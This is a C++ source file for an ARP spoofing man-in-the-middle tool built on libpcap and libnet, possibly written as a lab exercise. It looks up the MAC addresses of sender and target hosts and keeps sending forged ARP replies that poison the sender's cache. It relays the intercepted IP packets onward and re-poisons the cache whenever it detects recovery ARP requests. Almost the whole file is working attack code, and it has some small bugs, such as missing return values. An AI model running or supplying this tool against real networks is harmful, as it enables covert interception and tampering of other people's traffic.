#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cassert>
#include <ctime>

#include <array>
#include <map>
#include <vector>
#include <algorithm>

#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>

#include <pthread.h>

using namespace std;

#ifdef DEBUG
#define ASSERT(cond, msg)\
if(!(cond)) {\
    fprintf(stderr, "Assertion failed: %s. file: %s. line: %d\n", (msg), __FILE__, __LINE__);\
    exit(1);\
}
#else
#define ASSERT(cond, msg)\
if(!(cond)) {\
    fprintf(stderr, "Error: %s\n", (msg));\
    exit(1);\
}
#endif

#define WARN(cond, msg)\
if(!(cond)) {\
    fprintf(stderr, "Error: %s\n", (msg));\
}

#define SPOOF_PERIOD                10
#define TIMEOUT                     10

#define MAX_DUMP_LENGTH             100

#define ETHER_BROADCAST_SRC_MAC     "\xFF\xFF\xFF\xFF\xFF\xFF"
#define ARP_REQUEST_TARGET_MAC      "\x00\x00\x00\x00\x00\x00"   

struct arp_packet {
    struct libnet_ethernet_hdr ether;
    struct libnet_arp_hdr arp;
    uint8_t sender_mac[ETHER_ADDR_LEN];
    struct in_addr sender_ip;
    uint8_t target_mac[ETHER_ADDR_LEN];
    struct in_addr target_ip;
} __attribute__((packed));

struct ip_packet {
    struct libnet_ethernet_hdr ether;
    struct libnet_ipv4_hdr ip;
};

struct host_info {
    uint8_t mac[ETHER_ADDR_LEN];
    struct in_addr ip;
};

struct session {
    struct host_info sender_info;
    struct host_info target_info;
};

struct replay_args {
    uint8_t *packet;
    size_t length;
    struct session session;
};

typedef std::array<uint8_t, ETHER_ADDR_LEN> mac;

struct host_info attacker_info;
vector<struct session> session_list;
map<mac, struct session> session_map;
pcap_t *handle;

bool recover = false;

void print_char(char c) {
    if(0x20 <= c && c < 0x7F)
        printf("%c", c);
    else {
        printf(".");
    }
}

void print_mac(const char *name, uint8_t *mac) {
    printf("%s = ", name);
    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
        if(i != ETHER_ADDR_LEN - 1)
            printf("%02x:", mac[i]);
        else
            printf("%02x", mac[i]);
    }
    printf("\n");
}

void print_ip(const char *name, struct in_addr ip) {
    printf("%s = %s\n", name, inet_ntoa(ip));
}

void dump_data(uint8_t *p, int32_t len) {
    int32_t _len = min(MAX_DUMP_LENGTH, len);
    int32_t idx = 0;
    while(idx < _len) {
        int tmp = min(_len - idx, 16);
        for(int i = idx; i < idx + tmp; i++) {
            printf("%02X ", p[i]);
        }
        for(int i = tmp; i < 16; i++) {
            printf("   ");
        }
        printf("    ");
        for(int i = idx; i < idx + tmp; i++) {
            print_char(p[i]);
        }
        printf("\n");
        idx += tmp;
    }
}

void get_attacker_info(uint8_t mac[], struct in_addr *ip, char *dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ASSERT(fd != -1, strerror(errno));

    strncpy(ifr.ifr_name, dev, IF_NAMESIZE);
    ASSERT(ioctl(fd, SIOCGIFHWADDR, &ifr) == 0, strerror(errno));
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);

    strncpy(ifr.ifr_name, dev, IF_NAMESIZE);
    ASSERT(ioctl(fd, SIOCGIFADDR, &ifr) == 0, strerror(errno));
    *ip = ((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr;

    close(fd);
}


void get_arp_packet(struct arp_packet *packet, uint8_t *sender_mac, struct in_addr sender_ip, 
                        uint8_t *target_mac, struct in_addr target_ip, bool is_request) {
    // Ether
    if(is_request)
        memcpy(packet->ether.ether_dhost, ETHER_BROADCAST_SRC_MAC, ETHER_ADDR_LEN);
    else
        memcpy(packet->ether.ether_dhost, target_mac, ETHER_ADDR_LEN);
    memcpy(packet->ether.ether_shost, sender_mac, ETHER_ADDR_LEN);
    packet->ether.ether_type = htons(ETHERTYPE_ARP);

    // ARP
    packet->arp.ar_hrd = htons(ARPHRD_ETHER);
    packet->arp.ar_pro = htons(ETHERTYPE_IP);
    packet->arp.ar_hln = ETHER_ADDR_LEN;
    packet->arp.ar_pln = sizeof(struct in_addr);
    if(is_request)
        packet->arp.ar_op = htons(ARPOP_REQUEST);
    else
        packet->arp.ar_op = htons(ARPOP_REPLY);
    memcpy(packet->sender_mac, sender_mac, ETHER_ADDR_LEN);
    packet->sender_ip = sender_ip;
    if(is_request)
        memcpy(packet->target_mac, ARP_REQUEST_TARGET_MAC, ETHER_ADDR_LEN);
    else 
        memcpy(packet->target_mac, target_mac, ETHER_ADDR_LEN);
    packet->target_ip = target_ip;
}

inline bool parse_arp_packet(uint8_t *mac, const uint8_t *packet, size_t packet_len, struct in_addr ip) {
    if(packet_len < sizeof(struct arp_packet))
        return false;
    struct arp_packet *arp_view = (struct arp_packet *) packet;
    if(arp_view->ether.ether_type != htons(ETHERTYPE_ARP))
        return false;
    if(arp_view->sender_ip.s_addr != ip.s_addr)
        return false;
    memcpy(mac, arp_view->sender_mac, ETHER_ADDR_LEN);
    return true;
}

void *replay_thread_main(void *_args) {
    struct replay_args *args = (struct replay_args *) _args;
    struct libnet_ethernet_hdr *ether_view = (struct libnet_ethernet_hdr *)args->packet;
    memcpy(ether_view->ether_shost, attacker_info.mac, ETHER_ADDR_LEN);
    memcpy(ether_view->ether_dhost, args->session.target_info.mac, ETHER_ADDR_LEN);
    WARN(pcap_sendpacket(handle, (const u_char*) args->packet, args->length) == 0, pcap_geterr(handle));
    free(args->packet);
    free(args);
}

inline bool check_replay(struct session session, const uint8_t *packet, size_t length) {
    if (length < sizeof(struct ip_packet))
        return false;
    struct ip_packet *ip_packet_view = (struct ip_packet *) packet;
    if (ip_packet_view->ether.ether_type != htons(ETHERTYPE_IP))
        return false;
    
    struct replay_args *replay_args = (struct replay_args *) malloc(sizeof(struct replay_args));
    uint8_t *new_packet = (uint8_t *) malloc(length);
    ASSERT(new_packet != NULL, "malloc failed");
    memcpy(new_packet, packet, length);
    replay_args->packet = new_packet;
    replay_args->session = session;
    replay_args->length = length;
    pthread_t replay_thread;
    ASSERT(pthread_create(&replay_thread, NULL, &replay_thread_main, (void *) replay_args) == 0, "Failed to create replay_thread");
    return true;
}

inline bool check_recover(struct session session, const uint8_t *packet, size_t length) {
    if(length < sizeof(struct arp_packet))
        return false;
    
    struct arp_packet *arp_view = (struct arp_packet *) packet;
    if(arp_view->ether.ether_type != htons(ETHERTYPE_ARP))
        return false;
    if(arp_view->arp.ar_op != htons(ARPOP_REQUEST))
        return false;
    if(arp_view->target_ip.s_addr == session.target_info.ip.s_addr)
        return false;
    
    printf("[*] Recovery detected. \n");
    recover = true;

}

void spoof_sender(struct session session) {
    struct arp_packet spoof_packet;
    get_arp_packet(&spoof_packet, attacker_info.mac, session.target_info.ip, session.sender_info.mac, session.target_info.ip, false);
    WARN(pcap_sendpacket(handle, (const u_char*) &spoof_packet, sizeof(spoof_packet)) == 0, pcap_geterr(handle));
}

void *spoof_thread_main(void *) {
    while(true) {
        printf("[*] spoof senders\n");
        recover = false;
        for (auto it = session_list.begin(); it != session_list.end(); it++) {
            spoof_sender(*it);
        }
        time_t start_time = time(NULL);
        while(time(NULL) - start_time < SPOOF_PERIOD) {
            if(recover) break;
        }
    }
}


int main(int argc, char *argv[]) {
    if (argc < 4 || (argc % 2 == 1)) {
        printf("%s <Interface> <Sender IP 1> <Target IP 1> [<Sender IP 2> <Target IP 2>]...\n", argv[0]);
        exit(1);
    }

    char *dev = argv[1];
    get_attacker_info(attacker_info.mac, &(attacker_info.ip), dev);
    print_mac("attacker", attacker_info.mac);
    print_ip("attacker", attacker_info.ip);
    
    for (int i = 2; i < argc; i += 2) {
        struct session session;
        ASSERT(inet_aton(argv[i], &(session.sender_info.ip)) != 0, "Not a valid sender ip");
        ASSERT(inet_aton(argv[i+1], &(session.target_info.ip)) != 0, "Not a valid target ip");
        session_list.push_back(session);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    // setting sender info
    for (auto it = session_list.begin(); it != session_list.end(); it++) {
        print_ip("sender", it->sender_info.ip);
        struct arp_packet query_packet;
        get_arp_packet(&query_packet, attacker_info.mac, attacker_info.ip, NULL, it->sender_info.ip, true);
        ASSERT(pcap_sendpacket(handle, (const u_char *) &query_packet, sizeof(query_packet)) == 0, pcap_geterr(handle));

        bool found = false;
        time_t start_time = time(NULL);

        while (time(NULL) - start_time < TIMEOUT) {
            struct pcap_pkthdr *header;
            const uint8_t *packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            ASSERT(res != -1, pcap_geterr(handle));
            ASSERT(res != -2, "No more packet to read from savefile");

            if(parse_arp_packet(it->sender_info.mac, packet, header->caplen, it->sender_info.ip)) {
                found = true;
                break;
            }
        }
        ASSERT(found, "Could not get valid mac address");
        print_mac("sender", it->sender_info.mac);

        print_ip("target", it->target_info.ip);

        get_arp_packet(&query_packet, attacker_info.mac, attacker_info.ip, NULL, it->target_info.ip, true);
        ASSERT(pcap_sendpacket(handle, (const u_char *) &query_packet, sizeof(query_packet)) == 0, pcap_geterr(handle));

        found = false;
        start_time = time(NULL);

        while (time(NULL) - start_time < TIMEOUT) {
            struct pcap_pkthdr *header;
            const uint8_t *packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if(res == 0) continue;
            ASSERT(res != -1, pcap_geterr(handle));
            ASSERT(res != -2, "No more packet to read from savefile");

            if(parse_arp_packet(it->target_info.mac, packet, header->caplen, it->target_info.ip)) {
                found = true;
                break;
            }
        }
        ASSERT(found, "Could not get valid mac address");
        print_mac("target", it->target_info.mac);

        session_map.insert(pair<mac, struct session>(reinterpret_cast<mac &>(it->sender_info.mac), *it));
    }

    pthread_t spoof_thread;
    ASSERT(pthread_create(&spoof_thread, NULL, &spoof_thread_main, NULL) == 0, "Failed to create spoof_thread");
    
    while (true) {
        struct pcap_pkthdr *header;
        const uint8_t *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        ASSERT(res != -1, pcap_geterr(handle));
        ASSERT(res != -2, "No more packet to read from savefile");
        
        struct libnet_ethernet_hdr *ether_view;
        if (header->caplen < sizeof(struct libnet_ethernet_hdr))
            continue;
        ether_view = (struct libnet_ethernet_hdr *) packet;
        auto it = session_map.find(reinterpret_cast<mac &>(ether_view->ether_shost));
        if (it == session_map.end())
            continue;
        if (check_replay((*it).second, packet, header->caplen))
            continue;
        if (check_recover((*it).second, packet, header->caplen))
            continue;
    }
    
    
}